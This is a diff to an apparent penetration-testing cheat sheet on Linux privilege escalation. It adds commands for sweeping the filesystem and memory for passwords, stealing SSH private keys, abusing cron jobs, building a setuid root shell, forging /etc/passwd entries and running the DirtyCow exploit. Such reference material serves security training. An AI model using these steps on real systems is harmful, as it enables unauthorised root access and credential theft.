@@ -10,12 +10,132 @@ cat /etc/passwd
 
 ## Services/Processes Running
 
-```
+```bash
 ps aux
 ps aux | grep root
 ```
 
+## History
+
+```bash
+history
+```
+
+## Network Information
+
+```bash
+#list the TCP/IP configuration of every network adapter
+ip a
+# display network routing tables
+/sbin/route(l)
+route
+ip route
+# display active network connections and listening ports
+netstat -ano
+ss -anp 
+arp -a
+ip neigh
+```
+
+## Looting for passwords
+
+#### Files containing passwords
+
+```bash
+grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
+grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null
+find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
+```
+
+#### Last edited files
+
+Files that were edited in the last 10 minutes
+
+```bash
+find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
+```
+
+#### In memory passwords
+
+```bash
+strings /dev/mem -n10 | grep -i PASS
+```
+
+#### Find sensitive files
+
+```bash
+locate password | more           
+locate pwd| more
+locate pass | more 
+```
+
+## SSH Key
+
+#### Sensitive files
+
+```bash
+find / -name authorized_keys 2> /dev/null
+find / -name id_rsa 2> /dev/null
+...
+```
+
+If we have read access over the `.ssh` directory for a specific user, we may read their private ssh keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`, and use it to log in to the server. If we can read the `/root/.ssh/` directory and can read the `id_rsa` file, we can copy it to our machine and use the `-i` flag to log in with it:
+
+```bash
+lojique@htb[/htb]$ vim id_rsa
+lojique@htb[/htb]$ chmod 600 id_rsa
+lojique@htb[/htb]$ ssh user@10.10.10.10 -i id_rsa
+
+root@remotehost#
+```
+
+## Scheduled tasks
+
+#### Cron jobs
+
+Check if you have access with write permission on these files.\
+Check inside the file, to find other paths with write permissions.
+
+```bash
+/etc/init.d
+/etc/cron*
+/etc/crontab
+/etc/cron.allow
+/etc/cron.d 
+/etc/cron.deny
+/etc/cron.daily
+/etc/cron.hourly
+/etc/cron.monthly
+/etc/cron.weekly
+/etc/sudoers
+/etc/exports
+/etc/anacrontab
+/var/spool/cron
+/var/spool/cron/crontabs/root
+
+crontab -l
+ls -alh /var/spool/cron;
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny*
+```
+
+You can use [pspy](https://github.com/DominicBreuker/pspy) to detect a CRON job.
+
+```bash
+# print both commands and file system events and scan procfs every 1000 ms (=1sec)
+./pspy64 -pf -i 1000 
+```
+
 ## SUDO
+
+```bash
+sudo su -
+```
 
 Tool: [Sudo Exploitation](https://github.com/TH3xACE/SUDO\_KILLER)
 
@@ -62,6 +182,39 @@ void _init() {
 
 Execute any binary with the LD\_PRELOAD to spawn a shell : `sudo LD_PRELOAD=<full_path_to_so_file> <program>`, e.g: `sudo LD_PRELOAD=/tmp/shell.so find`
 
+## SUID
+
+SUID/Setuid stands for "set user ID upon execution", it is enabled by default in every Linux distributions. If a file with this bit is run, the uid will be changed by the owner one. If the file owner is `root`, the uid will be changed to `root` even if it was executed from user `bob`. SUID bit is represented by an `s`.
+
+```bash
+╭─swissky@lab ~  
+╰─$ ls /usr/bin/sudo -alh                  
+-rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/sudo
+```
+
+#### Find SUID binaries
+
+```bash
+find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+find / -uid 0 -perm -4000 -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+```
+
+## Create a SUID binary
+
+| Function   | Description                                             |
+| ---------- | ------------------------------------------------------- |
+| setreuid() | sets real and effective user IDs of the calling process |
+| setuid()   | sets the effective user ID of the calling process       |
+| setgid()   | sets the effective group ID of the calling process      |
+
+```bash
+print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
+gcc -o /tmp/suid /tmp/suid.c  
+sudo chmod +x /tmp/suid # execute right
+sudo chmod +s /tmp/suid # setuid bit
+```
+
 ## GTFOBins
 
 [GTFOBins](https://gtfobins.github.io/) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
@@ -80,10 +233,13 @@ find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
 
 ### Writable /etc/passwd
 
+{% embed url="https://infinitelogins.com/2021/02/24/linux-privilege-escalation-weak-file-permissions-writable-etc-passwd/" %}
+
 First generate a password with one of the following commands.
 
 ```bash
 openssl passwd -1 -salt hacker hacker
+openssl passwd newPassword
 mkpasswd -m SHA-512 hacker
 python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
 ```
@@ -188,6 +344,18 @@ https://www.exploit-db.com/exploits/50808
 #### CVE-2016-5195 (DirtyCow)
 
 Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
+
+{% embed url="https://www.exploit-db.com/exploits/40839" %}
+
+```c
+// Compile with:
+gcc -pthread dirty.c -o dirty -lcrypt
+//
+// Then run the newly create binary by either doing:
+"./dirty" or "./dirty my-new-password"
+//
+// Afterwards, you can either "su firefart" or "ssh firefart@..."
+```
 
 ```bash
 # make dirtycow stable
